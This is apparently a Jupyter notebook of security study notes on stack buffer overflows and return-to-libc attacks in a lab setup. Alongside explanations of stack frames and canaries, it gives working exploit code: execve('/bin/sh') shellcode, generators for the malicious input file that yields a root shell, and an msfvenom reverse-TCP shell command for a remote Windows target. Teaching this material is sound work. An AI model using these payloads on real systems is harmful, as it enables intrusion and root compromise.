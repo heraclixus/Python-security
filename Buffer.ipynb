{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Buffer Overflow and Return2Libc"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "![title](Layout.png)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## The memory layout of a C program:\n",
    "* __Text Segment__: read-only executable codes \n",
    "* __Data Segment__: stores static/global variables initialized by the programmer. \n",
    "* __BSS Segment__: uninitialized static/global variables. Normally all zeros, since uninitialized variables to zeros according to compiler.\n",
    "* __Heap__: space for dynamic memory allocation. _malloc, calloc, realloc, free_.etc. Heap grows from bottom to top (from lower memory address to higher)\n",
    "* __Stack__: space for local variables inside functions and data related to function calls. Stack grows top to bottom (from higher memory address to lower memory address).\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "![stackmemory](Stack.png)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "collapsed": true
   },
   "source": [
    "```c\n",
    "void func(int a, int b)\n",
    "{\n",
    "    int x,y;\n",
    "    x = a + b;\n",
    "    y = a - b; \n",
    "}\n",
    "```\n",
    "Assembly code for it:\n",
    "```\n",
    "pushl    %ebp\n",
    "movl     %esp, %ebp\n",
    "subl     $16, %esp\n",
    "movl     12(%ebp), %eax\n",
    "movl     8(%ebp), %edx\n",
    "addl     %edx, %eax\n",
    "movl     %eax, -8(%ebp)\n",
    "movl     12(%ebp), %eax \n",
    "movl     8(%ebp), %edx\n",
    "movl     %edx, %ecx\n",
    "subl     %eax, %ecx \n",
    "movl     %ecx, %eax \n",
    "movl     %eax, -4(%ebp)\n",
    "movl     %ebp, %esp \n",
    "popl     %ebp \n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Stack Frame Mechanisms \n",
    "whenever a function call is invoked, stack frame is allocated on memory. A stack frame contains: \n",
    "* Argument: values passed into the function \n",
    "* Return Address: stores the address the function returns to after it returns. \n",
    "* Previous Frame Pointer: the address of the callee of the function.\n",
    "* Local variables: variables allocated inside the scope of the function and garbage collected when function returns.\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "__Frame Pointer__ is introduced in CPU to point to a fixed location in the stack frame, so the address of each argument and local variable on the stack frame can be calculated using this register and an offset. Frame Pointer can be changed during runtime, whereas the offset can be determined at compile time. \n",
    "in x86 architecture, __frame pointer always point to the address of previous frame pointer__. in 32-bit architecture, return address and frame poitner both occupy 4 bytes. The detail can be seen directly from the assembly instructions "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "In function call scenario, frame pointers are used for each function to remember its caller's adress. Before entering the callee function, the caller's frame pointer value is stored in the __previous frame pointer__ field on the stack. When callee returns, the value in this field will be used to set the frame pointer register, making it point to the caller's stack frame again. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Stack Buffer Overflow \n",
    "Unlike Java, which can automatically detect the problem when a buffer is over-run, C and C++ are not able to detect it. \n",
    "A simple C program that overflows the buffer is simply using memory copying functions.\n",
    "\n",
    "```c\n",
    "#include <string.h>\n",
    "void foo(char *str)\n",
    "{\n",
    "    char buffer[12];\n",
    "    strcpy(buffer, str);\n",
    "}\n",
    "\n",
    "int main()\n",
    "{\n",
    "    char *str = \"this is definitely longer than 12\";\n",
    "    foo(str);\n",
    "    return 1;\n",
    "}\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The stackframe layout for the program is as follows: \n",
    "![layout](stack2.png)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Since the buffer's allocated size is 12, but the input string is more than 12 bytes, it will rewrite some of the previous frame pointer in a machine without stack protection activated. When the return address portion is rewritten, several things can happen:\n",
    "* The new address could be undefined and program crashes\n",
    "* The new address is protected by kernel and eception raised, program will crash\n",
    "* The new address point to data instead of instruction, program crashes\n",
    "* The new address point to instructions, but the program logic will inevitably change."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "__Exploitation__ for buffer overflow would first be an attempt to modify the return address (previous frame pointer). This is an example of __arbitrary code execution__. One way is to return the function call to the memory address of a malicious file that contains shellcode exploits. The shell code can be injected into memory as a part of the memory copy operations in the C code. \n",
    "```c\n",
    "#include <stdlib.h>\n",
    "#include <stdio.h>\n",
    "#include <string.h>\n",
    "\n",
    "int foo(char *str) \n",
    "{\n",
    "    char buffer[100];\n",
    "    strcpy(buffer, str);\n",
    "    return 1;\n",
    "}\n",
    "\n",
    "int main(int argc, char** argv)\n",
    "{\n",
    "    char str[400];\n",
    "    FILE *badfile;\n",
    "    badfile = fopen(\"badfile\", \"r\");\n",
    "    fread(str, sizeof(char), 300, badfile);\n",
    "    foo(str);\n",
    "    printf(\"Returned properly\\n\");\n",
    "    return 1;\n",
    "}\n",
    "\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The \"bad code\" chunk of the code can be stored at the top of the stackframe (with offest calculated) and the return address can be rewritten to point to the beginning of the bad code. This is all done in the \"bad file\". This is the most basic form of buffer overflow. The real world examples are much more complicated. \n",
    "![badfile](badfile_insert.png)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Experiments on Ubuntu 16.04 (Local Exploit)\n",
    "#### Step1: Disable Address Randomization \n",
    "```\n",
    "sudo sysctl -w kernel.randomize_va_space=0\n",
    "```\n",
    "#### Step2: Compile the vulnerable Program\n",
    "the goal is to exploit buffer overflow vulnerability in a _Set-UID_ root program, which is executed at root privilege even by a normal user. THe commands are:\n",
    "```\n",
    "gcc -o stack -z execstack -fno-stack-protector stack.c \n",
    "sudo chown root stack\n",
    "sudo chmod 4755 stack\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The First command compiles the stack.c, and at the same time disables two countermeasures against stack overflow.\n",
    "* -z execstack: non-execution stack is disabled, the countermeasure is to make the stack non-executable, which prevents injected malicious code from getting executed. (The countermeasure is return-to-libc attack).\n",
    "* -fno-stack-protector: Stack Guard is disabled. The countermeasure detects stack overflow and is built-in in gcc compilers. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Step 3: Conducting Exploit:\n",
    "* Guess space should be small for the address of malicious code, since most programs don't have very deep stacks. Moreoever, addresses should introduce no conflicts since they are virtual memories and are mapped into different physical locations. \n",
    "* Without randomization, we can guess the fixed starting address of a stack, by printing out the address of a variable by dereferencing it and printing out with hex. \n",
    "```c\n",
    "printf(\"address is 0x%x \\n\", (unsigned int) &x);\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "* Another way to better guess is by creating many entry points for injected code. A way to do it is using __NOP sled__, as illustrated by the picture \n",
    "![nop](NOP.png)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Or better, simply finding the exact location\n",
    "if one can get a copy of the victim program and do some investigation (i.e. after getting a reverse shell), one can calculate the address. Analyze using gdb:\n",
    "```\n",
    "gcc -z execstack -fno-stack-protector -g -o stack_dbg stack.c\n",
    "touch badfile\n",
    "gdb stack_dbg \n",
    "(gdb) b foo\n",
    "(gdb) run \n",
    "```\n",
    "After breakpoint in the target function foo(), we can print out the value of ebp register: \n",
    "```\n",
    "(gdb) p $ebp     // assume gives 0xbffff188\n",
    "(gdb) p &buffer   // assume gives 0xbffff11c \n",
    "(gdb) p 0xbffff188 - 0xbffff11c\n",
    "(gdb) quit \n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "collapsed": true
   },
   "source": [
    "The frame pointer has address 0xbffff188, so that return address is \\$ebp + 4. By the NOP sled figure, we can set the value in return address as \\$ebp + 8. The offset is 108 from the above calculation, this means that distance between buffer and the ebp register is 108 bytes. We therefore need to pad the first 112 bytes of the buffer. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Step 4: Constructing the Input File "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "* The first 112 bytes of the buffer should be padding characters, for simplicity, assume that they are set as NOP, or /x90. \n",
    "* Then the next 4 bytes should be the beginning of the NOP sled, which is 0xbffff188 + 8. \n",
    "* Then the next chunk of codes will be a combination of NOP sled and the malicious shellcode. The shellcode is placed at the end of the buffer. \n",
    "The sample code is shown below"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```c\n",
    "#include <stdlib.h>\n",
    "#include <stdio.h>\n",
    "#include <string.h>\n",
    "\n",
    "char shellcode[] = \n",
    "    \"\\x31\\xc0\"       // xorl %eax, %eax \n",
    "    \"\\x50\"           // pushl %eax \n",
    "    \"\\x68\"\"//sh\"     // pushl 0x68732f2f \n",
    "    \"\\x68\"\"//bin\"    // pushl 0x6e69622f \n",
    "    \"\\x89\\xe3\"       // movl %esp, %ebx \n",
    "    \"\\x50\"           // pushl %eax \n",
    "    \"\\x53\"           // pushl %ebx \n",
    "    \"\\x89\\xel\"       // movl %esp, ecx \n",
    "    \"\\x99\"           // cdq \n",
    "    \"\\xb0\\x0b\"       // movb $0x0b, $al \n",
    "    \"\\xcd\\x80\"       // int $0x80\n",
    ";\n",
    "\n",
    "\n",
    "void main(int argc, char **argv) {\n",
    "    char buffer[200];\n",
    "    FILE *badfile;\n",
    "    memset(&buffer, 0x90, 200);\n",
    "    *((long*) (buffer + 112)) = 0xbffff188 + 0x80; \n",
    "    memcpy(buffer + sizeof(buffer) - sizeof(shellcode), shellcode, sizeof(shellcode)); \n",
    "    badfile = fopen(\"./badfile\", \"w\");\n",
    "    fwrite(buffer, 200, 1, badfile);\n",
    "    fclose(badfile);\n",
    "}    \n",
    "\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The value stored inside the return address is not 0xbffff188 + 8, instead, it is set to be 0xbffff188 + 0x80. This is because while we got the offset of 8 in gdb, the actual address could be bigger, since gdb would push some data onto the stack at beginning. Also, the content of badfile __should not have bad characters such as 0x00__, which could truncate the whole file. This includes the address computed after 0xbffff188 + nnn. For example if nnn = 0x78, the result 0xbffff200 will have 0x00, and this will truncate the whole buffer. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Step 6: Run the exploit\n",
    "If we compile the code above and generate the badfile, then, if we run the _stack_ executable again, we can get a root shell. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Writing Shellcode "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The core part to get a shell is to use the _execve()_ system call to execute \"/bin/sh\". This means we need to set four registers: \n",
    "* %eax: must contain 11, which is the system call number for execve().\n",
    "* %ebx: must contain the address of the command string (\"/bin/sh\"). \n",
    "* %ecx: must contain the address of the argument array; in our case, the first element of the array points \"/bin/sh\" string, while the second element is 0 (which marks end of array). \n",
    "* %edx: must contain the address of the environment variables that we want to pass to the new program. We can set it to zero, as no need to input environment variables. \n",
    "To achieve these, we need to know the address of the \"/bin/sh\" string. and have to worry about zeros too. <br>\n",
    "A shortcut is simply to use the metasploit framework's __msfvenom__ module. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Example Shellcode explanation:\n",
    "```c\n",
    "    \"\\x31\\xc0\"       // xorl %eax, %eax \n",
    "    \"\\x50\"           // pushl %eax \n",
    "    \"\\x68\"\"//sh\"     // pushl 0x68732f2f \n",
    "    \"\\x68\"\"//bin\"    // pushl 0x6e69622f \n",
    "    \"\\x89\\xe3\"       // movl %esp, %ebx \n",
    "    \"\\x50\"           // pushl %eax \n",
    "    \"\\x53\"           // pushl %ebx \n",
    "    \"\\x89\\xel\"       // movl %esp, ecx \n",
    "    \"\\x99\"           // cdq \n",
    "    \"\\xb0\\x0b\"       // movb $0x0b, $al \n",
    "    \"\\xcd\\x80\"       // int $0x80\n",
    "\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Step1: Finding the address of \"/bin/bash\" string and set %ebx \n",
    "we first push the string to stack, since we can only push four bytes at a time, we need to divide the string into 3 pieces, 4 bytes each, and last piece first (since stack grows from high to low address).\n",
    "* xorl %eax %eax : using XOR operation on eax register can set it to zero, without introducing any zeros in code.\n",
    "* pushl %eax: push a zero into the stack. This zero marks the end of the \"/bin/sh\" string. \n",
    "* pushl \\$0x68732f2f: push \"//sh\" into the stack. double slash is used because 4 bytes is required, and double slash is treated the same as single slash by execve(). \n",
    "* pushl \\$0x6e69622f: push \"/bin\" into the stack. Now \"/bin/sh\" has all been pushed on the stack, and ebp now points to the beginning of the string. \n",
    "* movl %esp, %ebx: Move %esp to %ebx. This way we save the string's address in register ebx. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Step2: Finding address of the name[] array and set %ecx "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The name[] array should contain two elements, address of \"/bin/sh\" for name[0] and 0 for name[1]. \n",
    "* pushl %eax : construct the second item of the name array. Which is simply zero. \n",
    "* pushl %ebx : ebx contains address of \"/bin/sh\". push it and the entire name array is constructed. \n",
    "* movl %esp, %ecx : esp now points to beginning of name array, so we save the address to register ecx. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Step 3: Setting %edx to zero:\n",
    "* cdq : simply copies sign bit (0) of value in %eax into every bit position in %edx, setting it to zero. This instruction is only 1 byte long. \n",
    "* xorl %edx, %edx : can also work, but takes 4 bytes of memory. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Step 4: Invoking the exeve() system call\n",
    "* movb \\$0x0b, %al : sets al (lower 8 bits of %eax register) to 11 (the opcode for the execve() system call). Notice that %eax is zero before the setting. So now %eax stores simply 11. \n",
    "* int \\$0x80: executes the system call. _int_ instruction triggers interrupt to kernel mode, and opcode 0x80 makes system call. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Another way: Kali Demo "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "collapsed": true
   },
   "source": [
    "### Remote Buffer Overflow\n",
    "The attack against a remote service could begin with _fuzzing_: send out strings with incremental length to the target port, and expect crash. \n",
    "* use the __pattern_create.rb__ in Kali Linux to send out unique strings\n",
    "* If able to capture the %eip register's value in the debugger, search the pattern in __pattern_offset.rb__ in Kali Linux and find the offset.\n",
    "* Observe the value of register esp and try to manipulate its value (In this case, the Windows exploit example has esp directly pointing to the buffer location, which should be a great location for shellcode).\n",
    "* When generating shell code in __msfvenom__, rule out the bad character sets. \n",
    "* Return address under __address randomization__ would break the general buffer overflow introduced in the previous section. The way around is find the esp register (return address) at the event of crash. We can locate the register by looking for __reliable, accessible__ memory location that contains the instruction \n",
    " ```\n",
    " jmp %esp \n",
    " ```\n",
    " Reliable and accessible means that there is no memory protection such as DEP and ASLR present, and memory range does not contain bad characters. \n",
    " * The search for the instruction is accomplished via the __!mona.py__ script in the Immunity Debugger. \n",
    "     * This process include to first find the hex representation of the assembly instruction, via __nasm_shell.rb__ in Kali Linux. \n",
    " * ``` !mona find -s \"\\xff\\xe4\" -m slmfc.dll ``` as an example \n",
    " * Put the address found from mona.py right after the padding (up until register %eip). \n",
    " * Pad the rest of the with some NOP sled (i.e. \"\\x90\" * 8)\n",
    " * Pad the rest of buffer with shellcode,generated from ``` msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.4 LPORT=443 -f c -e x86/shikata_ga_nai -b \"\\x00\\x0a\\x0d\" "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Stack Guard Bypass \n",
    "The first example serves to deal with the most basic stack overflow, where there is no countermeasure implemented in compiler or hardware. The kernel address randomization's countermeasure is explained in the Kali Linux Exploit case. The case of non-executable stack is illustrated in the __Return-to-libc Attack__ below. This section dedicates to bypassing another mechanism introduced by the gcc compiler, called __stack gaurd__. <br>\n",
    "#### Stack Guard \n",
    "This countermeasure observes the fact that \n",
    "* Any stack overflow attack has to modify the return address\n",
    "* All the memory between return address and the buffer will be overwritten. \n",
    "Therefore, the compiler place some non-predictable value between the buffer and the return address. Before returning the function, it checks whether the value is modified or not. If it is modified, it is likely that return address is modified, and the compiler will warn the user of a _stack smash_.\n",
    "* The value of the __guard__ should not be stored in the stack, or otherwise it is overwritten too.\n",
    "* It can be stored in heap, BSS, data segment. (i.e. an uninitialized global variable is stored in BSS segment) \n",
    "Example following shows the idea of stack guard:\n",
    "```c\n",
    "//unintialized, value given at runtime by random number generator.\n",
    "int secret;\n",
    "\n",
    "void foo(char *str) {\n",
    "    int guard;\n",
    "    gaurd = secret; \n",
    "    char buffer[12];\n",
    "    strcpy(buffer, str);\n",
    "    if (guard==secret)\n",
    "        return;\n",
    "    else \n",
    "        exit(1); \n",
    "}\n",
    "\n",
    "```\n",
    "The gcc compiler have built-in stack guard, so if the -fno-stack-protector -z is not enabled, it is automatically on. We can examine the assembly code for a program to find out the stack guard. Sample __canary code__ is: \n",
    "```\n",
    "movl     %gs:20, %eax\n",
    "movl     %eax, -12(%ebp)\n",
    "xorl     %eax, %eax \n",
    "...\n",
    "movl     -12(%ebp), %eax \n",
    "xorl     %gs:20,  %eax \n",
    "je       .L2 \n",
    "call     _stack_chk_fail \n",
    "```\n",
    "Key property of the stack canary should be that: \n",
    "* it must be random value\n",
    "* it must be stored from outside of the stack \n",
    "\n",
    "#### Bypass "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## The Return-to-libc Attack"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "collapsed": true
   },
   "source": [
    "This type of attack aims at the __non-executable stack__ countermeasure. It aims at using the codes already in memory when the injected code cannot be executed. The best target is the _libc_ library, one that is used alot and loaded into memory by OS everytime. <br>\n",
    "One example is to use the _system()_ call from the clib, and pass \"/bin/sh\" to it. <br>\n",
    "Using the same vulnerable sample C code, but compile it with \n",
    "```\n",
    "gcc -fno-stack-protector -z nonexeccstack -o stack stack.c\n",
    "sudo sysctl -w kernel.randomize_va_space=0 \n",
    "sudo chown root stack\n",
    "sudo chmod 4755 stack\n",
    "```\n",
    "These two commands make the program non-stack executable and turns off address randomization (whose bypass method is introduced in previous Kali example). Also the program is SETUID program, allowing us to exploit and get a root shell"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Find the address of system(): \n",
    "First, debug the program with gdb, and after run it, check the loaded system call's memory address:\n",
    "```\n",
    "touch badfile \n",
    "gdb stack \n",
    "(gdb) run \n",
    "(gdb) p system\n",
    "$1 = {<text variable, no debug info>} 0xb7e5f430 <system>\n",
    "(gdb) p exit\n",
    "$2 = {<text variable, no debug info>} 0xb7e52fb0 <exit> \n",
    "(gdb) quit\n",
    "``` \n",
    "### Find address of \"\\bin\\sh\" string:\n",
    "We have previously use the stack to place the string. Now we can also use the environment variable. \n",
    "```c\n",
    "//envaddr.c \n",
    "#include <stdio.h>\n",
    "int main() {\n",
    "    char *shell = (char *)gentenv(\"MYSHELL\");\n",
    "    if (shell) {\n",
    "        printf(\" Value: %s\\n\", shell);\n",
    "        printf(\" Address: %x\\n\", (unsigned int) shell);\n",
    "    }\n",
    "    return 1; \n",
    "}\n",
    "```\n",
    "with the following command \n",
    "```\n",
    "gcc envaddr.c -o env55\n",
    "export MYSHELL=\"/bin/sh\"\n",
    "./env55\n",
    "```\n",
    "This works because the environment variable is passed into the child process of the shell program (our vulnerable program), loaded directly into its virtual memory. The environment variable's memory location is sensitive to the filename. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Prepare for the argument:\n",
    "Before the vulnerable program jump to the system() function, we need to place the argument on the stack ourselves. We need to know the location for the ebp register when we invoke the system() function call.The location should be ebp+8 in our case. \n",
    "![ebp](ebp.png)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Without address randomization, we need to predict the location for register ebp after the jump into the system() function. To do this, we need to understand __function prologue__ and __function epilogue__. \n",
    "#### Function Prologue \n",
    "In assembly, function prlogue is code at the beginning of a function, used to prepare the stack and registers for the function. On IA32, it normally consists of: \n",
    "```\n",
    "pushl %ebp                // saves caller function's address \n",
    "movl  %esp, %ebp          // frame pointer to current location\n",
    "subl  $N, %esp            // allocate space for local variables \n",
    "```\n",
    "\n",
    "#### Function Epilogue \n",
    "The code at the end of the function call. It is used to restore the stack nd registers back to the state before the function is invoked. \n",
    "```\n",
    "movl %ebp, %esp       // release stack memory \n",
    "popl %ebp             // assign previous pointer to ebp\n",
    "ret                   // free return address, jump to to it\n",
    "```\n",
    "Note that the return address is 4 bytes above the stack frame pointer. x86 has _leave_ and _enter_ for function epilogue and function prologue."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now the meatly part: we need to find where to place the argument for the system() by first inspecting the function epilogue of the vulnerable program and the function prologue of the system() function call. To make the vulnerable function return to system() function call in clib, we need to trace register $esp for this task <br>.\n",
    "Once the vulnerable function returns, stack space is recycled, ebp pointer is recycled until the new function call makes it point to esp. Once the program jumps into system(), the function prologue will be executed, ebp will have the esp value, and esp will move for four bytes below. The argument should be placed 8 bytes above the ebp register (or 4 bytes above the esp register). The place marked by ebp + 4 should be treated as return address of the system() call, which in our case could be an exit() function. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### The Malicious Input\n",
    "__find the offset between buffer and the ebp register__: \n",
    "```\n",
    "gcc -fno-stack-protector -z nonexecstack -g -o stack_dbg stackc.c\n",
    "touch badfile \n",
    "gdb stack_dbg \n",
    "(gdb) b vul_func \n",
    "(gdb) run \n",
    "(gdb) p &buffer\n",
    "(gdb) p $ebp \n",
    "(gdb) p 0xbffff208 - 0xbffff1ce    // 58 \n",
    "```\n",
    "The offset between buffer start and the ebp register is 58 bytes, therefore: \n",
    "* address of the system() function should be in offset of 62 bytes \n",
    "* address of the exit() function should be in offset of 66 bytes\n",
    "* address of the string \"/bin/sh\" should be in offset of 70 bytes\n",
    "These requirements give us the new c code:\n",
    "```c\n",
    "#include <stdio.h>\n",
    "#include <string.h>\n",
    "int main(int argc, char** argv) {\n",
    "    char buf[200];\n",
    "    FILE *badfile;\n",
    "    memset(buf, 0xaa, 200); \n",
    "    *(long *) &buf[70] = 0xbffffe8c; // address of \"/bin/sh\" \n",
    "    *(long *) &buf[66] = 0xb7e52f60; // address of exit() \n",
    "    *(long *) &buf[62] = 0xbfe5f430; // address of system() \n",
    "    badfile = fopen(\"./badfile\", \"w\");\n",
    "    fwrite(buf, sizeof(buf), 1, badfile);\n",
    "    fclose(badfile); \n",
    "}\n",
    "```\n",
    "We run the same vulnerable program as before and we should get a root shell (only with the executable name as the same length as _env55_ we compiled earlier, the ennvironment variable file). \n",
    "```\n",
    "gcc ret_to_libc_exploit.c -o exploit \n",
    "./exploit \n",
    "./stack\n",
    "```"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python [default]",
   "language": "python",
   "name": "python2"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 2
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython2",
   "version": "2.7.13"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
